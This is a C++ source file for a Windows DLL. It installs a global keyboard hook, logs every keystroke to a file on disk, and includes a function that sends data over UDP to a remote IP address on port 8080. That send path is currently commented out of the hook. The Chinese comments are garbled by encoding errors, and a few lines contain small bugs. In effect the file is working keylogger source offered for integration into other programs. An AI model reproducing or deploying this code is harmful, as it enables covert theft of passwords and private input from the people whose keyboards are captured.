// hoookdll.cpp : ���� DLL Ӧ�ó���ĵ���������
//

#include "stdafx.h"
#include <stdio.h>
#include "pub.h"

/* dllʹ��˵��

��һ������hookdll.h��hookdll.lib���뵽��Ŀ��

�ڶ���������Ŀ��cpp�ļ��м���
#include "hookdll.h"
#pragma comment(lib, "hookdll.lib")

���������ڳ���ʼִ�е�ʱ�����
	InstallLaunchEv();

���Ĳ�������פ�ڴ�

���岽�������˳�ʱ����
	UnInstallLaunchEv();

����������hookdll.dll��������Ŀ�����Ŀ�ִ���ļ�Ŀ¼��

*/

HHOOK Hook;
LRESULT CALLBACK LauncherHook(int nCode, WPARAM wParam, LPARAM lParam);
void strerror(DWORD errno);
void savelog(const char *s);
void send_udp(const char *s);
extern HMODULE hHookDll;

__declspec(dllexport) void WINAPI UnInstallLaunchEv() // dll�ĵ�������
{
	UnhookWindowsHookEx(Hook);
}


__declspec(dllexport) void WINAPI InstallLaunchEv() // dll�ĵ�������
{
	// HMODULE hHookDll = LoadLibrary("hookdll"); // �õ�dll�ľ��

	// install keyboard hook to trap all keyboard message
	Hook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)LauncherHook, hHookDll, 0);// 0 ����ȫ�ֵ�Hook
	if (Hook == NULL)
	{
		strerror(GetLastError());
	}
}

LRESULT CALLBACK LauncherHook(int nCode, WPARAM wParam, LPARAM lParam) // dll�ڲ�ʹ�õĺ���
{
	LRESULT Result = CallNextHookEx(Hook, nCode, wParam, lParam);

	if (nCode == HC_ACTION)
	{
		char buf[100];
		//memset(buf, 0, sizeof(buf));
		//sprintf(buf, "%u", wParam); // ����wParamΪ����ɨ����
		//send_udp(buf); // ��Զ����������udp��Ϣ

		memset(buf, 0, sizeof(buf));
		sprintf(buf, "%x\t%c\t%08\n", wParam, wParam, lParam); //������wParam, lParamд��buf
		savelog(buf); //����֮��дlog��־
	}
	return Result;
}

void send_udp(const char *s)//��Ŀ����������udp��Ϣ
{
	init_socket();
	SOCKET st = create_send_socket();
	send_work(st, "10.200.247.75", 8080, s);
	close_socket(st);
}

void savelog(const char *s)
{
	FILE *p = fopen("D:\\myhook.log", "a+");
	fputs(s, p);
	fclose(p);
}

void strerror(DWORD errno) //����GetLastError()����ֵ����������Ϣת��Ϊ���ģ�д��myhook.log��
{
	void *lpMsgBuf;
	FormatMessageA(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		errno,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(char *) &lpMsgBuf,
		0,
		NULL
		);

	savelog((const char *) &lpMsgBuf);
	LocalFree(lpMsgBuf);
}